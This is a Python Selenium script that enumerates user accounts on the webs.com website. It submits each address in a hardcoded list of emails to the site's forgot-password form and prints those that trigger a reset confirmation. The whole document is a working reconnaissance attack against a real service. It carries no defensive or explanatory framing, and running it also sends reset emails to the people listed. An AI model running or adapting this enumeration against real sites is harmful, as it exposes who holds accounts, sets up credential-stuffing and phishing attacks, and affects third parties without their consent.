# User Enum Webs
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

print("The usernames present in Webs are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://www.webs.com/s/login/forgotPassword")
    p1 = driver.page_source
    #sleep(3)
    elem=driver.find_element_by_xpath("//input[@type='text']")
    #elem = driver.find_element_by_name("email")
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)

    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "We've sent password reset instructions to your email address." in p2:
        print(i)
    sleep(2)
    driver.close()
